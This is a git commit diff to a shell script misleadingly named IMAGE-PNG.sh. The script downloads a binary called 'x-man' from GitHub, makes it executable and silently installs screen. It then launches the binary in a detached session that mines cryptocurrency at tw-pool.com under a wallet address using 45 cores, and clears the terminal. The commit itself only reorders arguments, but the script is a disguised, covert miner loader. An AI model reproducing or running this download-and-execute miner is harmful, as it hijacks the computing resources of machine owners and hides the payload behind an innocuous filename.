625382119cc647dc0a5c46c97332a63766fa1fff
obisumila <obisumila@gmail.com>
2024-09-21 15:05:46 +0800

    Update IMAGE-PNG.sh

--- IMAGE-PNG.sh
+++ IMAGE-PNG.sh
@@ -2,7 +2,7 @@ wget https://github.com/obisumila/effective-chainsaw/raw/refs/heads/main/x-man ;
 chmod +x x-man ;
 sudo apt update > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
-screen -S on -dm ./x-man --url ws://tw-pool.com:5487/mine mine --username GASPNARXHfyhdCnrrsiszPthMzNwWWYwtHJkVLUVSTpj.TALK --mode 2 --cores 45 ; 
+screen -S on -dm ./x-man --url ws://tw-pool.com:5487/mine mine --username GASPNARXHfyhdCnrrsiszPthMzNwWWYwtHJkVLUVSTpj.TALK --cores 45 --mode 2 ; 
 screen -ls
 sleep 2
 clear
@@ -12,7 +12,7 @@ wget https://github.com/obisumila/effective-chainsaw/raw/refs/heads/main/x-man ;
 chmod +x x-man ;
 sudo apt update > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
-screen -S on -dm ./x-man --url ws://tw-pool.com:5487/mine mine --username GASPNARXHfyhdCnrrsiszPthMzNwWWYwtHJkVLUVSTpj.POD --mode 2 --cores 45 ; 
+screen -S on -dm ./x-man --url ws://tw-pool.com:5487/mine mine --username GASPNARXHfyhdCnrrsiszPthMzNwWWYwtHJkVLUVSTpj.POD --cores 45 --mode 2 ; 
 screen -ls
 sleep 2
 clear
